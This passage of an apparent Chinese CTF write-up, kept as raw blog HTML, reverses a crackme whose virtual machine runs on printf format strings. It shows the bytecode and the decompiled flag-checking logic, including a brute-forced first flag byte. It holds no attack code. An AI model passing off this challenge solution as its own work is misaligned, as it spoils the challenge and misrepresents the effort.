class="hljs-tag">%<span class="hljs-selector-tag">3</span><span class="hljs-selector-class">.1lM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">3</span><span class="hljs-selector-class">.2lO</span></span><br><span class="hljs-tag">%</span>-7.3C\x00<br><span class="hljs-tag">%<span class="hljs-selector-tag">0</span><span class="hljs-selector-class">.4096hhM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0</span><span class="hljs-selector-class">.255llI</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.0lM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.8llL</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0</span><span class="hljs-selector-class">.1lU</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.0lM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.16llL</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0</span><span class="hljs-selector-class">.1lU</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.200llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.1788llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">7C</span></span>%-6144.1701736302llM<br><span class="hljs-tag">%<span class="hljs-selector-tag">0</span><span class="hljs-selector-class">.200hhM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0</span><span class="hljs-selector-class">.255llI</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0</span><span class="hljs-selector-class">.37llO</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0200</span><span class="hljs-selector-class">.0C</span></span>\x00&#x27;&#x27;&#x27;<br></code></pre></td></tr></table></figure><p>其中的 \x00 可以理解为基本块的结尾，由于 goto 指令 fprintf 调用递归的特性，代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta"># goto 指令的实现</span><br><span class="hljs-built_in">fprintf</span>(stream, &amp;a52cS[info-&gt;width]);<br></code></pre></td></tr></table></figure><p>基本块结尾会返回到 goto 指令的下一条指令（可以理解为 call 指令）</p><p>入口指令反编译结果如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++">_0:  <span class="hljs-keyword">goto</span> _52<br>_7:  state[<span class="hljs-number">3</span>] = a52cS[state[<span class="hljs-number">1</span>]]<br>_13: state[<span class="hljs-number">3</span>] ^= state[<span class="hljs-number">0</span>] # flag0 解密表<span class="hljs-number">1</span><br>_19: a52cS[state[<span class="hljs-number">1</span>]] = state[<span class="hljs-number">3</span>] <br>_26: state[<span class="hljs-number">1</span>] += <span class="hljs-number">4</span><br>_33: state[<span class="hljs-number">3</span>] = state[<span class="hljs-number">1</span>]<br>_39: state[<span class="hljs-number">3</span>] -= state[<span class="hljs-number">2</span>]<br>_45: <span class="hljs-keyword">if</span> state[<span class="hljs-number">3</span>] &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">goto</span> _7<br><br>_52: state[<span class="hljs-number">0</span>] = a52cS[<span class="hljs-number">4096</span>]<br>_62: state[<span class="hljs-number">0</span>] &amp;= <span class="hljs-number">255</span><br>_71: state[<span class="hljs-number">1</span>] = state[<span class="hljs-number">0</span>]<br>_77: state[<span class="hljs-number">1</span>] &lt;&lt;= <span class="hljs-number">8</span><br>_84: state[<span class="hljs-number">0</span>] |= state[<span class="hljs-number">1</span>]<br>_90: state[<span class="hljs-number">1</span>] = state[<span class="hljs-number">0</span>]<br>_96: state[<span class="hljs-number">1</span>] &lt;&lt;= <span class="hljs-number">16</span><br>_104: state[<span class="hljs-number">0</span>] |= state[<span class="hljs-number">1</span>]<br>_110: state[<span class="hljs-number">1</span>] = <span class="hljs-number">200</span><br>_119: state[<span class="hljs-number">2</span>] = <span class="hljs-number">1788</span><br>_129: <span class="hljs-keyword">goto</span> _7<br><br>_152: state[<span class="hljs-number">0</span>] = a52cS[<span class="hljs-number">200</span>]<br>_161: state[<span class="hljs-number">0</span>] &amp;= <span class="hljs-number">255</span><br>_170: state[<span class="hljs-number">0</span>] -= <span class="hljs-number">37</span><br>_178: <span class="hljs-keyword">if</span> state[<span class="hljs-number">0</span>] == <span class="hljs-number">0</span> <span class="hljs-keyword">goto</span> _200<br></code></pre></td></tr></table></figure><p>入口第一段指令对 a52cS[200] 开始的字符串进行解密，密钥是输入flag的第 1 个字节，解密完成后跳转到 a52cS[200] 处开始执行。</p><p>爆破 flag 第一个字节，当为 T 的时候，解密出来的数据有点像 vmcode</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">4</span><span class="hljs-selector-class">.5000llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0</span><span class="hljs-selector-class">.13200llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">337C</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0</span><span class="hljs-selector-class">.0llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">500C</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1262C</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0653</span><span class="hljs-selector-class">.0C</span></span>\x00<br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.0llM</span></span>\x00<br><span class="hljs-tag">%<span class="hljs-selector-tag">3</span><span class="hljs-selector-class">.0lM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">3</span><span class="hljs-selector-class">.2lN</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0253</span><span class="hljs-selector-class">.3C</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.1llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">3</span><span class="hljs-selector-class">.2lM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">3</span><span class="hljs-selector-class">.3lX</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">3</span><span class="hljs-selector-class">.0lO</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">3</span><span class="hljs-selector-class">.1llO</span></span><br><span class="hljs-tag">%</span>-261.3C\x00<br><span class="hljs-tag">%</span>+4.0lM<br><span class="hljs-tag">%<span class="hljs-selector-tag">4</span><span class="hljs-selector-class">.2llS</span></span>\x00<br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.1llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.2llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">261C</span></span><br><span class="hljs-tag">%</span>+322.1C<br><span class="hljs-tag">%<span class="hljs-selector-tag">0</span><span class="hljs-selector-class">.1llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.13600llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.0lO</span></span><br><span class="hljs-tag">%</span>+337.1C\x00<br><span class="hljs-tag">%<span class="hljs-selector-tag">0</span><span class="hljs-selector-class">.0llM</span></span>\x00<br><span class="hljs-tag">%<span class="hljs-selector-tag">0</span><span class="hljs-selector-class">.2llV</span></span>\x00<br><span class="hljs-tag">%<span class="hljs-selector-tag">0</span><span class="hljs-selector-class">.3llX</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0</span><span class="hljs-selector-class">.1llS</span></span>\x00<br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.0lM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.2llN</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0405</span><span class="hljs-selector-class">.1C</span></span><br><span class="hljs-tag">%</span>+413.1C<br><span class="hljs-tag">%<span class="hljs-selector-tag">470C</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0</span><span class="hljs-selector-class">.1llS</span></span>\x00<br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.0lM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.1llO</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0397</span><span class="hljs-selector-class">.1C</span></span><br><span class="hljs-tag">%</span>+428.1C\x00<br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.0lM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.4096llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">4</span><span class="hljs-selector-class">.2hM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">4</span><span class="hljs-selector-class">.255llI</span></span><br><span class="hljs-tag">%</span>+540.4C\x00<br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.0lM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.2llX</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.5000llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.2hM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.255llI</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">4</span><span class="hljs-selector-class">.2lE</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0</span><span class="hljs-selector-class">.1llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.0lM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">470C</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">4</span><span class="hljs-selector-class">.0lS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">4</span><span class="hljs-selector-class">.255llI</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0</span><span class="hljs-selector-class">.2lM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.1llO</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.4500llS</span></span><br><span class="hljs-tag">%</span>+2.4lM<br><span class="hljs-tag">%<span class="hljs-selector-tag">500C</span></span>\x00<br><span class="hljs-tag">%<span class="hljs-selector-tag">0</span><span class="hljs-selector-class">.123456789llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.0llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.4096llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.1hM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0</span><span class="hljs-selector-class">.1lE</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.0llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.846786818llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.0lE</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.0llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.6144llS</span></span><br><span class="hljs-tag">%</span>+1.2lM<br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.4llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.4096llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.1hM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0</span><span class="hljs-selector-class">.1lE</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.0llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.1443538759llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.0lE</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.4llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.6144llS</span></span><br><span class="hljs-tag">%</span>+1.2lM<br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.8llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.4096llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.1hM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0</span><span class="hljs-selector-class">.1lE</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.0llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.1047515510llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.0lE</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.8llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.6144llS</span></span><br><span class="hljs-tag">%</span>+1.2lM<br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.12llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.4096llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.1hM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0</span><span class="hljs-selector-class">.1lE</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.0llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.359499514llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.1724461856llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.0lE</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.12llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.6144llS</span></span><br><span class="hljs-tag">%</span>+1.2lM<br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.16llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.4096llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.1hM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0</span><span class="hljs-selector-class">.1lE</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.0llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.241024035llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.0lE</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.16llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.6144llS</span></span><br><span class="hljs-tag">%</span>+1.2lM<br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.20llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.4096llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.1hM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0</span><span class="hljs-selector-class">.1lE</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.0llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.222267724llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.0lE</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.20llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.6144llS</span></span><br><span class="hljs-tag">%</span>+1.2lM<br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.24llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.4096llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.1hM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0</span><span class="hljs-selector-class">.1lE</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.0llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.844096018llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.0lE</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.24llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.6144llS</span></span><br><span class="hljs-tag">%</span>+1.2lM\x00<br><span class="hljs-tag">%<span class="hljs-selector-tag">0</span><span class="hljs-selector-class">.0llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.0llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.4500llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.1hM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.0llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.1374542625llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.1686915720llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.1129686860llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.2lE</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0</span><span class="hljs-selector-class">.1lU</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.4llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.4500llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.1hM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.0llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.842217029llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.1483902564llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.2lE</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0</span><span class="hljs-selector-class">.1lU</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.8llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.4500llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.1hM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.0llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.1868013731llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.2lE</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0</span><span class="hljs-selector-class">.1lU</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.12llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.4500llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.1hM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.0llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.584694732llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.1453312700llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.2lE</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0</span><span class="hljs-selector-class">.1lU</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.16llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.4500llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.1hM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.0llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.223548744llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.2lE</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0</span><span class="hljs-selector-class">.1lU</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.20llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.4500llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.1hM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.0llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.1958883726llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.1916008099llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.2lE</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0</span><span class="hljs-selector-class">.1lU</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.24llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.4500llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.1hM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.0llM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.1829937605llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.1815356086llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.253836698llS</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.2lE</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0</span><span class="hljs-selector-class">.1lU</span></span>\x00<br></code></pre></td></tr></table></figure><p>反编译如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 